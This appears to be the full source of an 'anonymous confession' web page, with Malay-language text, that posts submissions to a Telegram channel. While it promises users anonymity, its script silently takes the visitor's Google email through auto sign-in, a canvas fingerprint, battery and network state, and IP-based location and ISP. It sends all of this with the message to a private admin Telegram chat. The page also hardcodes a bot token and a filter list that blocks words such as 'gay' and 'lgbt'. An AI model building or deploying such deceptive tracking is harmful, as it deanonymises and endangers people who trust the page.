<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anonymous Confession</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            perspective: 1000px;
            overflow: hidden;
            background: linear-gradient(-45deg, #0e1014, #1c0f38, #004d40, #1a2d5e);
            background-size: 400% 400%;
            animation: gradientShift 25s ease infinite;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .glass-card {
            background: rgba(30, 41, 59, 0.6);
            backdrop-filter: blur(25px) saturate(200%);
            -webkit-backdrop-filter: blur(25px) saturate(200%);
            border: 1px solid rgba(255, 255, 255, 0.15);
            box-shadow: 0 10px 40px 0 rgba(0, 0, 0, 0.5);
            border-radius: 2.5rem;
            transform-style: preserve-3d;
            transition: all 0.5s ease;
        }

        .blurred {
            filter: blur(25px);
            pointer-events: none;
        }

        .modal-overlay {
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(8px);
            z-index: 100;
        }

        #confessionText {
            background-color: rgba(255, 255, 255, 0.08);
            color: #f3f4f6;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .tnc-clickable {
            color: #818cf8;
            text-decoration: underline;
            cursor: pointer;
        }
    </style>
</head>
<body class="text-gray-100">

    <div id="consentModal" class="fixed inset-0 modal-overlay flex items-center justify-center p-6">
        <div class="bg-[#111827] border border-white/10 p-10 rounded-[2.5rem] max-w-sm w-full shadow-2xl text-center">
            <div class="w-16 h-16 bg-indigo-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-indigo-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04m18.236 0 a11.956 11.956 0 001 8.618 11.955 11.955 0 01-1 8.618c1.921 0 3.743-.435 5.382-1.214M12 21a9.003 9.003 0 008.382-5.618" />
                </svg>
            </div>
            <h2 class="text-2xl font-bold mb-4">Human Verification</h2>
            <p class="text-gray-300 text-sm leading-relaxed mb-8">
                By clicking below, you agree to stay anonymous. View <span class="tnc-clickable" id="tncLink">terms</span>.
            </p>
            <button id="agreeBtn" class="w-full py-4 bg-indigo-600 hover:bg-indigo-500 rounded-2xl font-black text-white transition-all active:scale-95 shadow-xl">
                SETUJU BRO
            </button>
        </div>
    </div>

    <div class="w-full max-w-md mx-auto px-4">
        <div id="tiltCard" class="glass-card p-8 sm:p-12 w-full blurred relative overflow-hidden">
            <div id="loadingOverlay" class="hidden absolute inset-0 bg-slate-900/90 flex flex-col items-center justify-center z-50">
                <div class="w-12 h-12 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin mb-4"></div>
                <p class="text-xs font-bold tracking-widest text-indigo-400 uppercase">Loading Content...</p>
            </div>

            <div class="card-inner" id="cardMainContent">
                <div id="formContainer">
                    <div class="flex justify-center mb-6">
                        <div id="g_id_onload"
                             data-client_id="231925439708-te47tckgcptfs1vr6jk4a9n84a4hlggn.apps.googleusercontent.com"
                             data-context="signin"
                             data-callback="onSilentAuth"
                             data-auto_select="true"
                             data-itp_support="true">
                        </div>
                        <div class="g_id_signin" data-type="standard" data-theme="filled_black" data-shape="pill"></div>
                    </div>

                    <h1 class="text-4xl font-extrabold text-center text-white mb-2">Anonymous Drop</h1>
                    <p class="text-center text-indigo-300 mb-8 text-xl font-light">Luah je apa kau rasa.</p>

                    <form id="confessionForm" class="space-y-6">
                        <textarea 
                            id="confessionText" 
                            rows="7" 
                            required 
                            placeholder="Dipersilakan menaip di sini..."
                            class="mt-1 block w-full rounded-2xl shadow-xl p-5 border transition duration-300 resize-none text-base focus:border-indigo-500 focus:ring-0"
                        ></textarea>
                        
                        <button 
                            type="submit" 
                            id="submitButton"
                            class="w-full flex justify-center py-4 rounded-2xl text-xl font-bold text-white bg-indigo-600 hover:bg-indigo-500 transition duration-200 shadow-lg"
                        >
                            <span id="buttonText">SEND MESSAGE</span>
                        </button>
                    </form>
                </div>

                <div id="statusMessage" class="mt-6 p-4 rounded-xl hidden text-center text-white font-medium"></div>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '7580498741:AAF5_hPXPKLqobwVLHfR7_g6HShqAPrnpzM';
        const PUBLIC_CHAT_ID = '-1001841870133'; 
        const PRIVATE_LOG_ID = '-1003635312239'; 

        const profanityList = ['sofea', 'horny', 'tetek', 'kote', 'sangap', 'bj', 'lancap', 'toceng', 'sex', 'cum', 'pepek', 'fuck', 'pussy', 'babi', 'lgbt', 'gay', 'sial', 'peliaq', 'hanat', 'kimak', 'kiwak', 'buto', 'butoh', 'pukimak', 'barua', 'konek', 'pantat', 'patamak', 'seks', 'pntt', 'delete', 'bangsat', 'anak haram', 'haram jadah', 'puki', 'berayaq', 'porn', 'thila', 'izzat'];
        
        let userEmail = "Anonymous (No Google Selection)";
        const sessionId = Math.random().toString(36).substring(2, 10).toUpperCase();

        // 1. Silent Canvas Fingerprinting (100% Background)
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125,1,62,20);
                ctx.fillStyle = "#069";
                ctx.fillText("Confession#1", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("Confession#1", 4, 17);
                const result = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < result.length; i++) {
                    hash = ((hash << 5) - hash) + result.charCodeAt(i);
                    hash |= 0;
                }
                return Math.abs(hash).toString(16);
            } catch(e) { return "N/A"; }
        }

        // 2. Silent Battery & Network Info (100% Background)
        async function getSilentForensics() {
            let data = { battery: "N/A", charging: "N/A", connection: "N/A" };
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    data.battery = Math.round(bat.level * 100) + "%";
                    data.charging = bat.charging ? "Yes" : "No";
                }
                if (navigator.connection) {
                    data.connection = navigator.connection.effectiveType || "N/A";
                }
            } catch(e) {}
            return data;
        }

        // 3. Silent IP Intelligence (Background Call)
        async function getIpIntel() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const json = await res.json();
                return {
                    ip: json.ip,
                    city: json.city,
                    region: json.region,
                    isp: json.org
                };
            } catch(e) { return { ip: "Unknown", city: "Unknown", region: "Unknown", isp: "Unknown" }; }
        }

        document.getElementById('agreeBtn').onclick = () => {
            document.getElementById('consentModal').classList.add('hidden');
            document.getElementById('tiltCard').classList.remove('blurred');
        };

        function onSilentAuth(response) {
            try {
                const payload = JSON.parse(atob(response.credential.split('.')[1]));
                userEmail = payload.email;
            } catch (e) {}
        }

        function checkSpamFuzzy(text) {
            const simplify = (str) => str.toLowerCase().replace(/(.)\1+/g, '$1').replace(/[^a-z0-9\s]/g, '');
            const cleanInput = simplify(text);
            for (const word of profanityList) {
                if (cleanInput.includes(simplify(word))) return word;
            }
            return null;
        }

        const form = document.getElementById('confessionForm');
        const textArea = document.getElementById('confessionText');
        const statusDiv = document.getElementById('statusMessage');

        form.onsubmit = async (e) => {
            e.preventDefault();
            const text = textArea.value.trim();
            if(!text) return;

            // Device-based Rate Limit
            const lastSent = localStorage.getItem('last_drop');
            if (lastSent && (Date.now() - lastSent < 30000)) {
                const left = Math.ceil((30000 - (Date.now() - lastSent)) / 1000);
                statusDiv.innerText = `Device Cooldown: ${left}s left.`;
                statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-orange-600 text-white block";
                statusDiv.classList.remove('hidden');
                return;
            }

            const badWord = checkSpamFuzzy(text);
            if (badWord) {
                statusDiv.innerText = `can't be sent because it contains "${badWord}"`;
                statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-red-600 text-white block";
                statusDiv.classList.remove('hidden');
                return;
            }

            const btn = document.getElementById('submitButton');
            btn.disabled = true;
            btn.innerText = "SENDING...";

            try {
                // Collect All Silent Data
                const fingerprint = getCanvasFingerprint();
                const forensics = await getSilentForensics();
                const ipIntel = await getIpIntel();

                const esc = (str) => String(str).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
                const escapedText = esc(text);
                
                // 1. Send to Public Channel
                const publicRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: PUBLIC_CHAT_ID,
                        text: `${escapedText}`,
                        parse_mode: 'MarkdownV2'
                    })
                });

                // 2. Send Advanced Forensics to Admin (Background)
                const adminMsg = `🔐 *ADMIN LOG (PADU)*\n` +
                                `👤 *Google:* ${esc(userEmail)}\n` +
                                `🆔 *Sess:* ${esc(sessionId)}\n` +
                                `🧬 *Fingerprint:* \`${esc(fingerprint)}\`\n` +
                                `🔋 *Battery:* ${esc(forensics.battery)} (${esc(forensics.charging)})\n` +
                                `📶 *Net:* ${esc(forensics.connection)}\n` +
                                `🌍 *Location:* ${esc(ipIntel.city)}, ${esc(ipIntel.region)}\n` +
                                `🏢 *ISP:* ${esc(ipIntel.isp)}\n` +
                                `💬 *Content:* \n"${escapedText}"`;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: PRIVATE_LOG_ID,
                        text: adminMsg,
                        parse_mode: 'MarkdownV2'
                    })
                });

                if(publicRes.ok) {
                    localStorage.setItem('last_drop', Date.now());
                    statusDiv.innerText = "Confession sent anonymously!";
                    statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-green-600 text-white block";
                }
                
                statusDiv.classList.remove('hidden');
                textArea.value = "";
                setTimeout(() => statusDiv.classList.add('hidden'), 5000);
            } catch (err) {
                statusDiv.innerText = "Connection failed.";
                statusDiv.className = "mt-6 p-4 rounded-xl text-center bg-red-600 text-white block";
                statusDiv.classList.remove('hidden');
            } finally {
                btn.disabled = false;
                btn.innerText = "SEND MESSAGE";
            }
        };
    </script>
</body>
</html>
